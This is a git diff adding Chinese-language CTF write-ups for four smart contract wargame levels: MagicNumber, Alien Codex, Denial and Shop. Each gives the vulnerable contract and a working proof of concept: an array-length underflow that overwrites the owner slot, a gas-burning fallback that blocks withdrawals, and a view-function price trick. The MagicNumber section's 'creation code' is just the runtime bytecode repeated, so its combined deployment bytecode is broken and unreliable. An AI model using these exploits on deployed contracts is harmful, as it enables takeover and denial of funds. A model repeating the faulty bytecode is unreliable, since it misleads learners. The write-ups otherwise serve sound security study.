@@ -1019,3 +1019,281 @@ contract Attack {
 [0xD6, 0x94, <challengeInstance>, 0x01]
 ```
 
+# MagicNumber
+- 这道题有点难，看 wp 学习的，不会手写 Opcode。
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract MagicNum {
+    address public solver;
+
+    constructor() {}
+
+    function setSolver(address _solver) public {
+        solver = _solver;
+    }
+
+    /*
+    ____________/\\\_______/\\\\\\\\\_____        
+     __________/\\\\\_____/\\\///////\\\___       
+      ________/\\\/\\\____\///______\//\\\__      
+       ______/\\\/\/\\\______________/\\\/___     
+        ____/\\\/__\/\\\___________/\\\//_____    
+         __/\\\\\\\\\\\\\\\\_____/\\\//________   
+          _\///////////\\\//____/\\\/___________  
+           ___________\/\\\_____/\\\\\\\\\\\\\\\_ 
+            ___________\///_____\///////////////__
+    */
+}
+```
+题目要求我们实现一个可以在 whatIsTheMeaningOfLife() 调用时返回正确的 32 字节数的合约【注释里提示了是42】，同时限制代码长度。这个题需要写一个 solver 合约，最多10字节（如果通过solidity写一个function也会超过10个字节）。题目提示我们需要离开 solidity 直接写 EVM Opcode 来满足功能。
+
+部署合约的字节码进一步可以分为：Creation Code（不包含进合约内，仅部署时执行）、Runtime Code。Constructor 中的逻辑就在 Creation Code。
+
+对于 Creation Code：
+- OPCODE: 0x60  NAME: PUSH1
+- OPCODE: 0x52  NAME: MSTORE
+- OPCODE: 0xf3  NAME: RETURN
+- OPCODE: 0x39  NAME: CODECOPY
+
+
+先构造 runtime code：目标是返回42即(0x2a),需要用到 return(p,s) 操作码，p是回传值在memory中的位置，s是回传值的大小，所以0x2a需要先存到memory中然后再return，于是用到 MSTORE(p,v)。
+```
+PUSH1 0x2a
+PUSH1 0x80 // 这里可以是任意值，通常 solidity 编译出的 opcode 这里是 0x80，因为之前的位置有别的用途，但手写 opcode 无所谓了
+MSTORE
+
+PUSH1 0x20 // 32 bytes - RETURN(p,s) - s - size
+PUSH1 0x80 // p - 上面 mstore 的地址
+RETURN
+```
+翻译成opcode：`602a60805260206080f3` 20 chars 刚好 10 bytes 
+
+然后写 creation code。需要完成的操作有：将 runtime code 加载到内存中，然后返回给 EVM。CODECOPY 操作码可以实现这个功能，CODECOPY(d,p,s) 需要三个参数：runtime code position in memory，current position of runtime opcode in the bytecode 和 size of the code in bytes。 回传给 EVM 需要用到： return(p,s);
+
+故构造如下：
+```
+PUSH1 s // 0x0a - 10 bytes - size of runtime opcode 和前面的 code 长度一致
+PUSH1 p // 
+PUSH1 d // dst position: 0x00 可以随便设
+CODECOPY
+// CODECOPY(d,p,s)
+PUSH1 s // 和上面一致 0x0a
+PUSH1 p // 和上面一致 0x00
+RETURN
+// return(p,s)
+```
+
+翻译成 bytecode:
+```
+602a60805260206080f3
+```
+组合一下：
+```
+602a60805260206080f3 + 602a60805260206080f3
+602a60805260206080f3602a60805260206080f3
+```
+
+部署：
+```solidity
+bytecode = "602a60805260206080f3602a60805260206080f3"
+txn = await web3.eth.sendTransaction({from: player, data: bytecode})
+await contract.setSolver(txn.contractAddress)
+```
+这里不止一种构造方式。
+
+参考资料：
+- [Learn EVM in depth #2. Executing the bytecode step by step in the deployment of a contract.](https://medium.com/coinmonks/learn-evm-in-depth-2-executing-the-bytecode-step-by-step-in-the-deployment-of-a-contract-270a6335df75)
+- [https://www.evm.codes/playground](https://www.evm.codes/playground)
+
+# Alien Codex
+- 本题参考资料：[ABI docs](https://docs.soliditylang.org/en/v0.4.21/abi-spec.html)
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.5.0;
+
+import "../helpers/Ownable-05.sol";
+
+contract AlienCodex is Ownable {
+    bool public contact;
+    bytes32[] public codex;
+
+    modifier contacted() {
+        assert(contact);
+        _;
+    }
+
+    function makeContact() public {
+        contact = true;
+    }
+
+    function record(bytes32 _content) public contacted {
+        codex.push(_content);
+    }
+
+    function retract() public contacted {
+        codex.length--;
+    }
+
+    function revise(uint256 i, bytes32 _content) public contacted {
+        codex[i] = _content;
+    }
+}
+```
+目标是夺取合约控制权（即将 owner 状态变量设置为我们的地址，这个变量来自继承的 Ownable 合约）。在 Solidity 0.5.0 之前，动态数组的长度是可修改的，codex.length-- 可以将数组长度减少。当数组长度减少到零以下时，会发生什么？在 Solidity 0.5.0 之前，codex.length-- 可能导致数组长度下溢，从而变成一个非常大的数。
+
+Solidity 中的存储是连续的，数组的元素紧跟在数组的起始位置之后。如果我们能够计算出存储槽的位置，就有可能覆盖其他状态变量。
+
+- Solidity 存储布局： 在 Solidity 中，状态变量在存储中的布局遵循以下原则：
+    - 每个状态变量存储在256位（32字节）的存储槽（slot）中。状态变量按照声明的顺序存储。 继承的合约优先。
+    - 如果多个状态变量的大小加起来不超过32字节，它们可以打包存储在同一个slot中。
+    - 动态大小的类型（如数组、映射）会占用单独的slot来存储指向其数据的指针。
+    - 动态数组（如 bytes32[]）的存储方式：数组的长度存储在一个槽中，其位置通过 keccak256(数组槽位置) 计算得到。数组的元素从计算得到的槽位置开始顺序存储。
+```
+array[0] = keccak256(uint256(slot)) + 0
+array[1] = keccak256(uint256(slot)) + 1
+...
+array[MAX] = keccak256(uint256(slot)) + 2 ^ 256
+```
+
+```js
+await web3.eth.getStorageAt("0x46bd82aBEe5DE33DadcE904DF892cdD1789EF2e7",0)
+'0x0000000000000000000000000bc04aa6aac163a6b3667636d798fa053d43bd11'
+await web3.eth.getStorageAt("0x46bd82aBEe5DE33DadcE904DF892cdD1789EF2e7",1)
+'0x0000000000000000000000000000000000000000000000000000000000000000'
+await web3.eth.getStorageAt("0x46bd82aBEe5DE33DadcE904DF892cdD1789EF2e7",2)
+'0x0000000000000000000000000000000000000000000000000000000000000000'
+```
+ownable 里有一个 owner 变量（address 类型，20 bytes）。然后 AlienCodex 里有俩变量（bool，bytes32[]）。根据上面的介绍，显然 address、bool在slot0，动态数组在slot1。这里我们还可以验证一下：
+```js
+await web3.eth.getStorageAt("0x46bd82aBEe5DE33DadcE904DF892cdD1789EF2e7",0)
+'0x0000000000000000000000010bc04aa6aac163a6b3667636d798fa053d43bd11'
+                          ⬆️ 这里变成了1 0bc04aa6aac163a6b3667636d798fa053d43bd11 刚好40个chars，20bytes
+                        bool, address
+```
+证明我们分析的正确性。 所以 codex 数组的起始槽位置为 1。数组元素的存储起始位置为 keccak256(1)。可以通过计算覆盖到其他存储槽。
+已知 array[0] = keccak256(uint256(1)) + 0，我们想要访问 slot 0，array[x] = 0 = keccak256(uint256(1)) + x
+=> x = 0 - keccak256(uint256(1)) =  2^256 - keccak256(uint256(1)) = 2^256-1-keccak256(uint256(1))+1
+
+```solidity
+uint256 public index = uint256(0) - uint256(keccak256(abi.encodePacked(uint256(1)))); // 需要用低版本的 solidity
+// or
+uint256 public index2 = (2**256 - 1) - uint256(keccak256(abi.encodePacked(uint256(1)))) + 1;
+// 35707666377435648211887908874984608119992236509074197713628505308453184860938
+// 0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a
+```
+但直接 revise player 地址也会有问题，因为 bytes[] 是大端序，这个数据会写到 0x前半截，而我们知道存储布局 owner 在slot0 0x....address的尾部。所以需要对player填充前导0。
+
+POC:
+```solidity
+await contract.retract() // codex underflow
+await contract.revise("0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a", web3.utils.padLeft(player, 64))
+```
+
+# Denial
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract Denial {
+    address public partner; // withdrawal partner - pay the gas, split the withdraw
+    address public constant owner = address(0xA9E);
+    uint256 timeLastWithdrawn;
+    mapping(address => uint256) withdrawPartnerBalances; // keep track of partners balances
+
+    function setWithdrawPartner(address _partner) public {
+        partner = _partner;
+    }
+
+    // withdraw 1% to recipient and 1% to owner
+    function withdraw() public {
+        uint256 amountToSend = address(this).balance / 100;
+        // perform a call without checking return
+        // The recipient can revert, the owner will still get their share
+        partner.call{value: amountToSend}("");
+        payable(owner).transfer(amountToSend);
+        // keep track of last withdrawal time
+        timeLastWithdrawn = block.timestamp;
+        withdrawPartnerBalances[partner] += amountToSend;
+    }
+
+    // allow deposit of funds
+    receive() external payable {}
+
+    // convenience function
+    function contractBalance() public view returns (uint256) {
+        return address(this).balance;
+    }
+}
+```
+题目要求是：阻止合约的所有者在调用 withdraw() 函数时提取资金，条件是合约仍然有余额并且调用时的 gas 消耗不超过 1M gas。这是一个经典的 Dos(denial of service) 问题。
+
+题目提供的合约是一个简单的钱包合约，主要功能是将合约中的资金按比例（1%）分发给 partner（合伙人）和合约的所有者 owner。主要流程如下：
+1. 合约拥有者可以调用 setWithdrawPartner() 设置合伙人地址。
+2. 调用 withdraw() 函数时，合约中的 1% 余额会分别发给 partner 和 owner，即 partner 得到一部分资金，owner 得到另一部分。
+3. withdraw() 函数中首先使用 partner.call{value: amountToSend}("") 将资金发送给合伙人，紧接着调用 payable(owner).transfer(amountToSend) 将资金发送给合约的 owner。
+
+题目要求是通过某种方式阻止合约 owner 从合约中提取资金，但合约中的资金仍然存在。这意味着我们需要在 withdraw() 函数中让 payable(owner).transfer() 无法成功完成。可以通过利用 partner.call{value: amountToSend}("") 来消耗大量的gas，使得 payable(owner).transfer() 没有足够的gas执行。 call() 方法没有限制 gas 的使用，允许消耗大量的gas，而 transfer() 默认只能使用 2300 gas。如果 partner.call() 消耗了足够多的 gas，payable(owner).transfer() 就会因为gas不足而失败。将我们自己的合约设为 partner，在我们的合约中设计一种方法，消耗大量的gas，从而阻止 owner 提取资金。
+
+POC:
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract Attack {
+    fallback() external payable {
+        while(true){}
+    }
+}
+```
+```js
+await contract.setWithdrawPartner("0x096fb29B3474Fe58D8da00d52EAB27eF9b75Bb02")
+```
+
+# Shop
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface Buyer {
+    function price() external view returns (uint256);
+}
+
+contract Shop {
+    uint256 public price = 100;
+    bool public isSold;
+
+    function buy() public {
+        Buyer _buyer = Buyer(msg.sender);
+
+        if (_buyer.price() >= price && !isSold) {
+            isSold = true;
+            price = _buyer.price();
+        }
+    }
+}
+```
+这个和之前做过的题有点像，第一次返回一个大于price的值，第二次返回一个小的值。但这个题和之前的不同的一点是函数是 view 修饰的。view 不能修改合约状态。所以看起来不能用之前的思路做了？但是 Buyer 合约可以反过来查询 Shop 的 isSold 状态，这样 buyer 就没有进行任何修改也可以改变 flag。
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+interface IShop {
+    function isSold() external view returns (bool);
+    function buy() external;
+}
+
+
+contract Buyer {
+    IShop shop = IShop(0x9543f67A97E33b4209CCBfe92A0370D98E1E3245);
+
+    function price() public view returns (uint256) {
+        if (shop.isSold()) return 1;
+        else return 100;
+    } 
+
+    function attack() public {
+        shop.buy();
+    }
+}
+```
